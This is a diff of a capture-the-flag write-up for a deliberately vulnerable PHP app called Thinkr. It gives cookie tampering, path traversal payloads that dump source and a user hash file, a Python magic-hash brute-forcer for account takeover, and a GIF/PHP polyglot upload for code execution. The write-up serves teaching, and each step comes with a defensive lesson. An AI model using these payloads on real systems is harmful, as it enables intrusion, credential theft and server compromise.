@@ -1,129 +1,164 @@
-# Thinkr
+# Thinkr CTF — Full Writeup
 
-## The challenge
+*"Your thoughts, disordered."*
 
-We are given access to a website, and the task is to exploit vulnerabilities in the website in order to gain unauthorized access to flags.
+Thinkr is a small PHP social network where users post "thoughts" that are displayed in random order. It's in invite-only beta. There are 5 flags hidden across the application, each requiring a different web exploitation technique. Here's how to find them all.
 
-## Flag 1
+---
 
-When we visit the website, we are redirected to a login page. It's worth viewing the source of the page to see what it's doing, what resources it's pulling in, etc.
+## Flag 1 — View Source
 
-What you see when you view page source, is the first flag.
+**`flag{3nt3r-th3-m@tr1><}`**
+
+This one's a freebie to get you warmed up.
+
+When you first visit the site, you land on `/signin.php`. Before doing anything fancy, do what you should always do first in a web CTF: **view the page source**.
 
 ```html
-<!doctype html>
 <!-- flag{3nt3r-th3-m@tr1><} -->
 <html>
+  <head>
+    <title>Sign in | Thinkr</title>
+    ...
 ```
 
-Other than that, there is nothing really interesting in the source of the login page. Note that if you view source on any page of the site, you will see this flag.
+An HTML comment right at the top of the page. The flag is in a shared header template, so it appears on every single page — you literally cannot miss it if you check the source.
 
-## Flag 2
+**Lesson:** Always view source. Always check comments. Developers leave things behind.
 
-It's fairly clear that to get further, you need to log in to the site. You don't have an account, so this is hard. A helpful link at the bottom of the page suggests that there might be a way to sign up to the site. If you click it, you're redirected to a page which tells you the site is in beta, so you can't sign up. You need a referral link, or to make the site think you clicked a referall link. (You could also try to break the login form, but you've seen nothing at this point to suggest that it's breakable.)
+---
 
-If you inspect your cookies, you'll notice that there's a conspicuous `has_referral=0` cookie. If you try setting this to `1` and view the signup page again, you are no longer redirected. At the bottom of the page is another flag.
+## Flag 2 — Cookie Monster
+
+**`flag{nOm-n0M-t@st1e-c00K13}`**
+
+The signin page has a link: *"Don't have an account? Get one!"* — but clicking it redirects you straight back to `/beta.php`, which says Thinkr is invite-only and you need a referral.
+
+Open your browser's developer tools and look at the cookies. You'll see one that was just set:
+
+```
+has_referral=0
+```
+
+That's... suspicious. What if we change it?
+
+```
+has_referral=1
+```
+
+Refresh, click the signup link again, and this time you land on `/signup.php`. The page loads with a signup form and, sitting right below it in a `<pre>` tag:
 
 ```
 flag{nOm-n0M-t@st1e-c00K13}
 ```
 
-## Flag 3
+The entire "invite-only beta" access control was a single client-side cookie. The server trusted whatever value your browser sent.
 
-Once you make an account for the site, you are sent to a page of thoughts which people have recently had. Seems to be some kind of hipster microblogging platform. There are links at the top of the page which apparently let you think and personalize, but you can't access them because your account has not been approved by an admin yet. As this process takes 2-4 days, it's unlikely that you'll be able to access these pages before the end of the CTF. All you can do is view other people's thoughts. The thoughts are truncated on the main page, but clicking them takes you to a URL like `http://127.0.0.1/read.php?thought=354ecf76c94067c7135cbe6e8905727d`.
+**Lesson:** Never trust the client. Cookies, hidden form fields, and HTTP headers are all attacker-controlled. Authorization decisions must happen server-side.
 
-We know the application is vulnerable, because there are more flags to find. There's a few things which could be problematic with a URL like this. Maybe we can access thoughts we aren't meant to? There's no indication that there are non-public thoughts in this app though, so that seems unlikely. Also, it seems that the identifiers for thoughts are unpredictable, so enumeration is hard. Maybe the GET parameter there is SQL-injectable? Add an apostrophe to find out. When we request `http://127.0.0.1/read.php?thought=354ecf76c94067c7135cbe6e8905727d%27` the result given is this:
+---
+
+## Interlude — Getting Inside
+
+Now we can sign up and log in. But the app tells us our account needs admin approval before we can post thoughts or upload photos ("This can take 2-4 days"). We're an **unverified** user.
+
+What *can* we do? We can browse the home page, which shows random thoughts from other users (animals like `cat`, `elephant`, `zebra`...), and click through to read individual thoughts at URLs like:
 
 ```
-Fatal error: Uncaught exception 'Exception' with message 'ID exceeds maximum length' in /var/www/html/storage/fsmodel.php:39 Stack trace: #0 /var/www/html/read.php(7): FSModel::load('354ecf76c94067c...') #1 {main} thrown in /var/www/html/storage/fsmodel.php on line 39
+/read.php?thought=a8f5f167f44f4964e6c998dee827110c
 ```
 
-Not an SQL error, but definitely interesting. IDs for thoughts have a maximum length. Do they have a minimum length? Supply a one-character thought ID to find out. `http://127.0.0.1/read.php?thought=3`
+Those thought IDs look like MD5 hashes. And they're being passed directly as a GET parameter. That's the most interesting attack surface we've seen so far.
+
+---
+
+## Flag 5 — Path Traversal
+
+**`flag{[_[_t3LeP@thy-1ntEn5if13s_]_]}`**
+
+### Step 1: Try SQL injection (and fail instructively)
+
+The `thought` parameter is pulling data from somewhere using what looks like a hash as a key. Our first instinct: maybe it's a database query? Let's try SQL injection. We take one of the thought URLs and append a classic payload:
 
 ```
-Fatal error: Uncaught exception 'Exception' with message 'Could not find storage at /var/www/html/data/Thought/3' in /var/www/html/storage/fsmodel.php:45 Stack trace: #0 /var/www/html/read.php(7): FSModel::load('3') #1 {main} thrown in /var/www/html/storage/fsmodel.php on line 45
+/read.php?thought=a8f5f167f44f4964e6c998dee827110c' OR 1=1 --
 ```
 
-Very interesting. It seems the programmer has implemented their own filesystem-based database for this app. Seems like the kind of thing which could be breakable. There are several other important pieces of information this error message gives us:
+We get an error, but not the SQL error we expected:
 
-* Thoughts are stored in `/var/www/html/data/Thought/`
-* Thought IDs are appended to this path without much, if any, validation
-* The PHP script being executed is at `/var/www/html/read.php`
+```
+ID exceeds maximum length
+```
 
-Trying to read files in the `/data` directory over HTTP unfortunately doesn't work.
+Interesting. It's treating the input as an "ID" with a length limit — that doesn't sound like SQL at all. The existing thought IDs are 32-character hex strings, so maybe the limit is 32. Let's try a shorter payload — just replace the ID entirely:
 
-Can we trick `read.php` into displaying it's own source? If we request `http://127.0.0.1/read.php?thought=../../read.php` we get the following (it's output as HTML, so I've reformatted it to have nice newlines and indentation).
+```
+/read.php?thought=test
+```
+
+A different error this time, and it's a goldmine:
+
+```
+Could not find storage at /var/www/html/data/Thought/test
+```
+
+The application just told us:
+
+1. **There is no database.** It's using the filesystem to store thoughts as individual files.
+2. **The full path** to where thoughts are stored: `/var/www/html/data/Thought/`
+3. **Our input is concatenated directly into a file path** with no sanitization.
+
+SQL injection is off the table, but something even better just opened up: **path traversal**.
+
+### Step 2: Read source code
+
+If thoughts live at `/var/www/html/data/Thought/[id]`, then `../` takes us up to `/var/www/html/data/`, and `../../` takes us to `/var/www/html/` — the web root where all the PHP files live.
+
+Let's read the application's own source code:
+
+```
+/read.php?thought=../../read.php
+```
+
+And there it is — the raw PHP source of `read.php` displayed right on the page. We can now read any file on the server (within a 32-character path length limit, but that's plenty).
+
+Let's read the files it references. At the top of `read.php` we see:
 
 ```php
-<?php
-require('checks.php');
 require_once('storage/thought.php');
 require_once('storage/user_thought.php');
 require_once('storage/user.php');
-$thought = Thought::load($_GET['thought']);
-$user = NULL;
-$edge = array_values(UserThoughtEdge::withThought($thought->getField('id')))[0];
-if ($edge != NULL) {
-	$author = User::load($edge->getField('user'));
-}
-$title = $thought->getPreview(10);
-require('_header.php');
-?><h1>Thought by <?php echo $author ? $author->getField('id') : 'someone'; ?></h1>
-<div id='thought'>
-	<?php echo htmlspecialchars($thought->getField('data')); ?>
-</div>
-<?php require('_footer.php');
 ```
 
-We also know the locations of other PHP files, and we can read them too. We can also request `http://127.0.0.1/storage/` to get a list of files which are used to represent data. We need to use our read.php exploit to read them though. So far we've been limited by the fact that our user hasn't been verified by an admin, so let's see if there's any way to make our user verified or to take over the account of another user. (Also, if you read `index.php` you'll see that a flag is dumped if the user who accesses the page is verfied). If we read `storage/user.php` we get this (again, reformatted):
+Let's read the user storage code:
+
+```
+/read.php?thought=../../storage/user.php
+```
+
+This reveals the `User` class extends `CSVModel`. Let's read that too:
+
+```
+/read.php?thought=../../storage/csvmodel.php
+```
+
+And there's the key line — CSVModel stores its data at:
 
 ```php
-<?php
-require_once('csvmodel.php');
-require_once('util.php');
-class User extends CSVModel {
-	static function getFields() {
-		return array("id", "salt", "hash", "verified", "photo");
-	}
-
-	private static function getHash($salt, $pw) {
-		return md5($salt.$pw);
-	}
-
-	function setPassword($pw) {
-		$salt = random_str(4);
-		$this->setField('salt', $salt);
-		$this->setField('hash', static::getHash($salt, $pw));
-	}
-
-	function checkPassword($pw) {
-		$hash = static::getHash($this->getField('salt'), $pw);
-		if ($hash == $this->getField('hash')) {
-			return TRUE;
-		} 
-		return FALSE;
-	}
+static function getStorage() {
+    return "/var/www/html/data/".static::class.".csv";
 }
 ```
 
-(Those unfamiliar with modern PHP may be surprised to discover that it has classes and unsuprised to discover that they suck.)
+So the `User` class stores everything in `/var/www/html/data/User.csv`. Since we're already traversing from `/var/www/html/data/Thought/`, that's just one directory up:
 
-There's a lot of interesting stuff here, but it's probably easier to work with this if we know how users are stored. There's no username field, so maybe a user's `id` is its username. (This is also confirmed if you read `read.php` carefully.) If we try to read `http://127.0.0.1/read.php?thought=../../data/User/<your_user>` we get another 'Could not find storage' error, so `User`s must be stored in a different format to `Thought`s. We can see that `User` extends `CSVModel`, so `CSVModel` might define how `User`s are stored. If we read `csvmodel.php` we get quite a lot of code, so I've just included the interesting parts:
+### Step 3: Dump the user database
 
-```php
-<?php
-abstract class CSVModel extends Model {
-   static function getStorage() {
-      return "/var/www/html/data/".static::class.".csv";
-   }
-
-   .
-   .
-   .
-}
+```
+/read.php?thought=../User.csv
 ```
 
-You can read the rest of the class to figure out what format the data is in, or you can just read the file it's stored in. Request `http://127.0.0.1/read.php?thought=../User.csv` and you get
+The entire user database spills onto the page:
 
 ```
 FLAG,,flag{[_[_t3LeP@thy-1ntEn5if13s_]_]},true,
@@ -133,154 +168,219 @@ cat,7bqa,cf52ee958dea0b0baafb539c4eaebb37,true,
 dog,7n3g,45713d9403a6f9420b279453a4c2accd,true,
 elephant,vunp,0e612198634316944013585621061115,true,
 fox,jfx7,26025af32166cbb306a8c0dba4b4df00,true,
-giraffe,oca1,8dd8558e45fd9dd1d5e66ccb36fb82d1,true,
-hippo,te6z,272d1cc23b97f10eadd8074c1bb06eb0,true,
-iguana,o2ak,48717c98395cc4b20a12ab543f874848,true,
-jackelope,p5pw,f2a3fb8dd47df7b4aac9371fac5ca776,true,
-koala,mlcb,68654ed2ff091ea8881fac855aa8de48,true,
-lizard,eex0,5b2084f4266c31c15da9449da5e90d86,true,
-monkey,y5nw,cbcca387e328939d8b50f8775ab39eb2,true,
-numbat,032m,892f8b9ffc370594847979ad7234ddf7,true,
-opossum,y8a2,42bf0fd88919f09f80b4fb6851b149d6,true,
-possum,wwob,243318f3472c1947ced1e0912b53feac,true,
-quail,p2m5,928995945cf0431c66fc6261444f50b2,true,
-rattlesnake,3ekg,290c0e31881db7c7752824734ae4d801,true,
-slug,qqtz,2bfa5d6ce5c5ddae3aa0de9c801b00f0,true,
-tiger,pbfh,7419e828a2dfd1365a30bbd2fcb72ad7,true,
-unicorn,wupu,1bfbc623dded215d13059694b519cb16,true,
-viper,fdg7,6fb877ebdb34d454dd7fdc24a9c91d7d,true,
-whale,mrkv,1f49dd35f92028b7ab22f8b4508e6133,true,
-xerus,hfrc,9763331cbb5d28781dce64e1b8c8a4c1,true,
+...
 zebra,uk0q,77aeef2799d85ecd68c3f38d372335f0,true,
 ```
 
-You might have guessed from the name of the class `CSVModel` that it stores models in CSV format. The top line contains a flag. This is as far as anyone got in the competion.
+The format is `username, salt, hash, verified, photo`. And right there on the first line — a user called `FLAG` whose "hash" field is actually the flag itself.
 
-## Flag 4
+That's **flag 5**: the reward for successfully reading the user database.
 
-There's been no indication that we can *create* an account and have that account verified. There's no code which even sets the `verified` field except `signup.php`. The admins must manually edit the CSV to verify users (No wonder it takes 2-4 days). There must be some issue that allows you to take over an account without knowing the password.
+### Step 4: Discover the flags directory (but can't reach it)
 
-From `user.php`, we know that the passwords are MD5s with a 4-character salt. If you had enough time, you could probably simply crack one of them. You don't have enough time so you need to be smarter. Let's look at the method which checks the hashes.
+While exploring source files, you'll notice most of them `require_once('config.php')`. Naturally, we read that too:
+
+```
+/read.php?thought=../../config.php
+```
+
+This reveals:
 
 ```php
-<?php
-class User extends CSVModel {
-	.
-	.
-	.
-	function checkPassword($pw) {
-		$hash = static::getHash($this->getField('salt'), $pw);
-		if ($hash == $this->getField('hash')) {
-			return TRUE;
-		} 
-		return FALSE;
-	}
-	.
-	.
-	.
+$GLOBALS['FLAGS_DIR'] = 'flagsflagsflagsflagsflagsflagsflagsflags';
+```
+
+So flags are stored in the filesystem, just like everything else — as files inside a directory with a long, obscure name. Can we traverse directly to them? The path from `/var/www/html/data/Thought/` would be:
+
+```
+../../flagsflagsflagsflagsflagsflagsflagsflags/flag4
+```
+
+Count the characters: **52**. That's well over the 32-character ID limit. The directory name isn't long by accident — it's a deliberate defense that makes the path too long for our traversal exploit. We can *see* where the flags are, but we can't *reach* them this way. We'll need something else to get there — but we'll get to that.
+
+**Lesson:** When a web app passes filenames or IDs as parameters, always try path traversal (`../`). And when your injection attempts produce error messages, *read them carefully* — even a "failed" attack can leak critical information about the application's internals.
+
+---
+
+## Flag 3 — PHP Type Juggling
+
+**`flag{fl0@t-l1k3-A-5tR1n9}`**
+
+This is the hardest flag in the challenge. It requires chaining together what we learned from reading the source code and the user database.
+
+### Step 1: Spot the vulnerability in source code
+
+When we read `user.php` via our path traversal earlier, one thing should have jumped out:
+
+```php
+function checkPassword($pw) {
+    $hash = static::getHash($this->getField('salt'), $pw);
+    if ($hash == $this->getField('hash')) {
+        return TRUE;
+    }
+    return FALSE;
 }
 ```
 
-PHP is a language with a lot of unexpected features. If you look at [the documentation for comparison operators](http://php.net/manual/en/language.operators.comparison.php) you'll see this:
+See it? The comparison operator is `==`, not `===`.
 
-|Example  | Name  | Result                                         |
-|---------|-------|------------------------------------------------|
-|$a == $b | Equal | TRUE if $a is equal to $b after type juggling. |
+In PHP, `==` is the *loose comparison* operator. It tries to be "helpful" by converting values before comparing them. `===` is *strict comparison* — it compares the raw string values byte-by-byte.
 
-What is type juggling? The PHP documentation itself doesn't give a useful definition. Essentially, when using an operator on 2 variables, i.e. `$x + $y` or `$a == $b`, PHP will automatically convert the variables so that they are the same type. This seems like a reasonable idea at face value, though many would argue that type conversions should be more explicit. Where this becomes a problem is that PHP may convert the variables to a different type *even if they were already the same type*. In particular, if 2 strings are both formatted like numbers, PHP will convert them both to numbers, then compare those numbers. If the string looks like an integer, but is too large to be an integer, PHP will convert it to a float, then compare the floats. If the string only looks like a float, it will only convert it to a float.
+For password hash comparison, `==` is dangerous. Here's why.
 
-Look again at the CSV of users. Does anything jump out at you? The user elephant has a password hash of `0e612198634316944013585621061115`. Interpreted as a float, this string evaluates to `0`. So does any string which starts with `0e` then a sequence of digits. An MD5 hex digest is 32 digits long. With some quick maths, we can determine that a particular MD5 digest has a `(1/16)^2 * (10/16)^30` chance of evaluating to 0. That's about 3 in 1 billion. That's easily brute-forceable. Here's a script which does it. It's randomised, which is a lazy way of making sure that if you run 8 instances of it at once, they don't do any duplicate work.
+### Step 2: Understand the exploit
+
+PHP's loose comparison has a quirk: if two strings both look like numbers in scientific notation, PHP converts them to floats before comparing. The string:
+
+```
+"0e612198634316944013585621061115"
+```
+
+...looks like `0 × 10^612198634316944013585621061115` to PHP. That evaluates to the float **0.0**.
+
+So if both the stored hash and our computed hash are strings matching `0e[digits only]`, PHP compares them as `0.0 == 0.0`, which is `true` — regardless of whether the actual hash values match.
+
+### Step 3: Find the target
+
+Now go back and look at the user database we dumped. We need a user whose stored hash matches the pattern `0e[only digits]`:
+
+```
+elephant,vunp,0e612198634316944013585621061115,true,
+```
+
+Elephant's hash starts with `0e` and the rest is all digits. That means *any* password that also produces a `0e[digits]` hash (with elephant's salt `vunp`) will pass the check.
+
+### Step 4: Find a colliding password
+
+We know from the source that passwords are hashed as `md5(salt + password)`. We need to brute-force a password `P` where:
+
+```
+md5("vunp" + P) matches /^0e[0-9]+$/
+```
+
+This pattern is rare — only 1 in 340,282,367 MD5 hashes qualify — so brute-force search needs many guesses. The right approach is random sampling across multiple processes, since every guess is independent:
 
 ```python
-import hashlib
-import re
-import string
-import random
+import hashlib, random, string, multiprocessing, os
 
-badhash = re.compile(r'^0e([0-9]*)$')
+salt = "vunp"
+charset = string.ascii_lowercase + string.digits
 
-length = 10
-pw_chars = string.ascii_lowercase + string.digits
+def worker(id):
+    attempts = 0
+    while True:
+        password = ''.join(random.choices(charset, k=8))
+        h = hashlib.md5((salt + password).encode()).hexdigest()
+        attempts += 1
+        if h.startswith("0e") and h[2:].isdigit():
+            print(f"Found! password={password}  hash={h}")
+            os._exit(0)
 
-def all_pw(lr):
-   if lr == 0:
-      yield ''
-   else:
-      shuffled = [c for c in pw_chars]
-      random.shuffle(shuffled)
-      for a in shuffled:
-         for rp in all_pw(lr-1):
-            yield a + rp
-
-for pw in all_pw(length):
-   h = hashlib.md5("vunp"+pw).hexdigest()
-   if badhash.match(h):
-      print pw
+if __name__ == "__main__":
+    for i in range(8):
+        multiprocessing.Process(target=worker, args=(i,)).start()
 ```
 
-As soon as you find a password which matches, you can log in as elephant. Elephant's password was `sbmlv657w6ffc9gv`. Some example collisions are `rtvt3dj12u` and `1dxrw487z0`. When you log in, you are shown another flag.
+With 8 workers this takes a few minutes. For example, password `5nszjp2c` produces hash `0e213581143648196021608869553810` — a match.
 
-## Flag 5
+### Step 5: Log in
 
-Becoming verified unlocks 2 new features. You can post your own thoughts and you can upload cool background photos so that your time spent posting is more awesome. From reading the code for posting thoughts, you can probably see that it's pretty solid (we have already exploited all of the bugs to get where we are, and it doesn't look like we can use them again). We know from the message associated with the previous flag that we need to gain access to the `flagsflagsflagsflagsflagsflagsflagsflags` directory. We can't use the file-reading exploit for this because the name of the directory is too long. Those who did well at this challenge during the competition may have noticed that config.php told you not to read from this directory, which was an error. To get the final flag you must read from this directory. Nobody got this far, so it fortunately was not a problem.
+- **Username:** `elephant`
+- **Password:** `5nszjp2c` *(or whatever your script found)*
 
-If you use the `read.php` exploit to read `photo.php`, you get this
+It works! And crucially, elephant is a **verified** user. The home page now shows a new section at the bottom that unverified users never see:
 
-```php
-<?php require('checks.php');
-require_once('storage/user.php');
-require_once('storage/thought.php');
-require_once('storage/user_thought.php');
-$user = User::load($_SESSION['user']);
-if (isset($_POST["submit"]) && $user->getField('verified') === 'true') {
-	$target_dir = "uploads/";
-	$target_file = $target_dir . basename($_FILES["file"]["name"]);
-	$uploadOk = 1;
-	// Check if image file is a actual image or fake image
-	$check = getimagesize($_FILES["file"]["tmp_name"]);
-	if($check === false) {
-		$uploadOk = 0;
-	} 
-	// Check if file already exists
-	if (file_exists($target_file)) {
-		$uploadOk = 0;
-	}
-	// Check file size
-	if ($_FILES["file"]["size"] > 500000) {
-		$uploadOk = 0;
-	}
-	if ($uploadOk == 1) {
-		move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
-		$user->setField('photo', $target_file);
-		$user->save();
-	}
-}
-$title = "Upload picture";
-require('_header.php'); ?>
+```
+flag{fl0@t-l1k3-A-5tR1n9}
 ```
 
-Some things to note:
+**Lesson:** In PHP, `==` is almost never what you want for security comparisons. Always use `===` or `hash_equals()`. This class of vulnerability is called "type juggling" and the `0e` pattern is known as a "magic hash." It's one of the most famous PHP-specific vulnerabilities.
 
-* The code does not check or set the file extension.
-* The code checks that the file is any kind of valid image
+---
 
-This means we can set our filename to end in `.php`, then the server will try to execute the uploaded file when we request it. For this to work, we need a file which is a valid image, and which also contains whatever payload we want. This actually isn't very hard. A JPEG can have arbitrary data appended to it and still be valid. A PHP file can have arbitrary data prepended to it and still be valid. We just need to write a script which dumps the flag and tack it onto the end of a JPEG file. Here's the PHP we want to execute:
+## Flag 4 — Unrestricted File Upload to RCE
 
-```php
-<?php
-echo "\n".file_get_contents("../flagsflagsflagsflagsflagsflagsflagsflags/flag4")."\n";
-?>
+**`flag{1M4G3-1N3-th3-p0S51b1Lit1ES}`**
+
+### Reconnaissance
+
+Now that we're logged in as elephant (a verified user), we have access to two features our unverified account couldn't use: posting thoughts and uploading a profile photo ("Personalize"). The photo upload is at `/photo.php`.
+
+We can read the source code using our path traversal:
+
+```
+/read.php?thought=../../photo.php
 ```
 
-Here's the bash to create the payload:
+From reading the source, we learn:
+
+1. The file is validated with `getimagesize()` — it must have valid image headers
+2. File size must be under 500KB
+3. The file must not already exist at the target path
+4. The file is saved to `uploads/` using the **original filename** from the upload
+5. **There is no file extension check**
+
+That last point is critical. The server checks that the uploaded file looks like an image, but it doesn't care if the filename ends in `.php`. And Apache will happily execute any `.php` file, regardless of what's inside it beyond the PHP tags.
+
+### Finding the flag location
+
+We already know from reading `config.php` earlier that flags live in a directory called `flagsflagsflagsflagsflagsflagsflagsflags/`. The path was too long for our traversal exploit — but with code execution, there's no such limitation.
+
+### Crafting the polyglot
+
+We need a file that:
+- Passes `getimagesize()` (valid image headers)
+- Contains PHP code that will execute
+- Has a `.php` extension
+
+This is called a **polyglot** — a file that is simultaneously valid in two formats. The simplest approach: a GIF header followed by PHP code.
 
 ```bash
-$ cat image.jpg hax.php > pwn.php
+printf 'GIF89a<?php echo file_get_contents("flagsflagsflagsflagsflagsflagsflagsflags/flag4"); ?>' > exploit.php
 ```
 
-Here's the bash to extract the flag
+`GIF89a` is the magic bytes for a GIF image — just six characters, but enough for `getimagesize()` to recognize it as a valid image. Apache, on the other hand, sees the `.php` extension and runs it through the PHP interpreter, which finds and executes the `<?php ... ?>` block.
 
-```bash
-$ curl http://127.0.0.1/uploads/pwn.php 2> /dev/null | grep -a flag
+### Pulling the trigger
+
+1. Go to `/photo.php`
+2. Upload `exploit.php` as your profile photo
+3. Visit `/uploads/exploit.php` in your browser
+4. The page displays:
+
+```
+flag{1M4G3-1N3-th3-p0S51b1Lit1ES}
 ```
 
+We now have arbitrary code execution on the server. Game over.
+
+**Lesson:** `getimagesize()` is not a security function. Validating that a file "is an image" does not make it safe to store with a user-controlled filename and extension. Secure file uploads must: (1) whitelist allowed extensions, (2) generate server-side filenames, and (3) ideally store uploads outside the web root or serve them through a handler that sets `Content-Type` and `Content-Disposition` headers.
+
+---
+
+## Summary
+
+| # | Flag | Technique | Difficulty |
+|---|------|-----------|------------|
+| 1 | `flag{3nt3r-th3-m@tr1><}` | View HTML source | Trivial |
+| 2 | `flag{nOm-n0M-t@st1e-c00K13}` | Cookie manipulation | Easy |
+| 5 | `flag{[_[_t3LeP@thy-1ntEn5if13s_]_]}` | Path traversal / file read | Medium |
+| 3 | `flag{fl0@t-l1k3-A-5tR1n9}` | PHP type juggling (`==` vs `===`) | Hard |
+| 4 | `flag{1M4G3-1N3-th3-p0S51b1Lit1ES}` | Unrestricted upload / RCE | Medium-Hard |
+
+### The Attack Chain
+
+Each flag chains into the next:
+
+1. **View source** gets you oriented.
+2. **Cookie bypass** gets you an account.
+3. **SQL injection attempt** fails but leaks the filesystem path, revealing the app uses file-based storage.
+4. **Path traversal** lets you read source code, which leads you to `User.csv`.
+5. **Reading User.csv** gives you the flag 5 and all the password hashes.
+6. **Reading the source code** reveals the `==` comparison bug. Cross-referencing with the hashes, you find elephant's `0e` hash is exploitable.
+7. **Logging in as elephant** (verified) unlocks the file upload.
+8. **Uploading a PHP polyglot** gives you code execution and the final flag.
+
+The intended difficulty curve goes: *easy warm-up → medium exploitation → hard crypto/logic → back to medium for the satisfying finale.* Every vulnerability is realistic — these are all mistakes that show up in real production PHP code.
+
+Thanks for playing!
